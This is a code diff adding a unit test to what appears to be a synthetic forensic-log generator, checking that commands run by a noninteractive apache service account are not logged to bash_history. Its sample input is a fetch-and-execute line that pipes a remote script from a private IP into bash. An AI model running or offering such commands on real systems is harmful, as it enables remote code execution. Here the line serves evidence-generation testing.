@@ -155,6 +155,27 @@ class TestBaselineLinuxBashHistory:
             "ActivityGenerator should have generate_bash_command"
         )
 
+    def test_web_service_process_commands_do_not_write_interactive_bash_history(
+        self, state_manager, mock_emitters, linux_system
+    ):
+        """Noninteractive web daemon children should not appear in bash_history."""
+        ag = ActivityGenerator(state_manager, mock_emitters)
+        apache = User(
+            username="apache",
+            full_name="Apache",
+            email="apache@system.local",
+            enabled=True,
+        )
+
+        ag.generate_bash_command(
+            apache,
+            linux_system,
+            datetime(2024, 3, 18, 12, 0, 0, tzinfo=UTC),
+            "/bin/bash -c 'curl http://10.0.0.5/s.sh | bash'",
+        )
+
+        assert not mock_emitters["bash_history"].emit.called
+
     def test_bash_command_pools_are_realistic(self):
         """The bash command YAML should contain common admin commands per role."""
         from evidenceforge.generation.activity.bash_commands import load_bash_commands
